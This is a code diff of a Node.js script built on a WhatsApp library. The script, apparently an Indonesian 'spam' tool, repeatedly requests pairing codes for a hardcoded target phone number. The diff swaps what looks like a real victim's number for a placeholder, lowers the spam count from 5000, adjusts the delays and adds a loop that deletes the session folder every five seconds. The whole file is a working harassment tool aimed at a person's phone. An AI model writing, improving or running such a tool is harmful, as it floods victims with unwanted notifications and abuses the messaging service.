@@ -39,11 +39,20 @@ const store = makeInMemoryStore({
 });
 
 // Hardcoded target phone number and spam count
-const targetPhoneNumber = "6285895954504"; // Replace with the target phone number
-const spamCount = 5000; // Replace with the number of times you want to spam
+const targetPhoneNumber = "+628xxx"; // Replace with the target phone number
+const spamCount = 5; // Replace with the number of times you want to spam
+const authStatePath = "./session";
 
-const pairingCode = true || process.argv.includes("--pairing-code");
-const useMobile = process.argv.includes("--mobile");
+// Function to delete the folder
+const deleteFolder = () => {
+  if (fs.existsSync(authStatePath)) {
+    fs.rmSync(authStatePath, { recursive: true, force: true });
+    console.log(chalk.bgBlack(chalk.redBright(`Folder '${authStatePath}' deleted`)));
+  }
+};
+
+// Set an interval to delete the folder every 5 seconds
+setInterval(deleteFolder, 5000);
 
 async function startspam() {
   let { 
@@ -54,7 +63,7 @@ async function startspam() {
   const {
     state: state,
     saveCreds: saveCreds
-  } = await useMultiFileAuthState("./cassaster");
+  } = await useMultiFileAuthState(authStatePath);
 
   const msgRetryCounterCache = new NodeCache();
   const spam = makeWASocket({
@@ -110,11 +119,11 @@ async function startspam() {
         code = code?.['match'](/.{1,4}/g)?.["join"]('-') || code;
         console.log(chalk.bgBlack(chalk.greenBright("Pairing Code: " + code)));
         console.log(chalk.bgBlack(chalk.whiteBright("Spam Dalam..: " + second + " s...")));
-        await new Promise(resolve => setTimeout(resolve, 300000));
+        await new Promise(resolve => setTimeout(resolve, 1000));
         second--;
       }
-      console.log(chalk.bgBlack(chalk.redBright(`Spam ke-${i + 1} selesai. Tunggu 1 detik sebelum melanjutkan...`)));
-      await new Promise(resolve => setTimeout(resolve, 1));
+      console.log(chalk.bgBlack(chalk.redBright(`Spam ke-${i + 1} selesai. Tunggu 30 detik sebelum melanjutkan...`)));
+      await new Promise(resolve => setTimeout(resolve, 30000));
     }
 
     console.log(chalk.bgBlack(chalk.greenBright(`Spam selesai sebanyak ${spamCount} kali.`)));
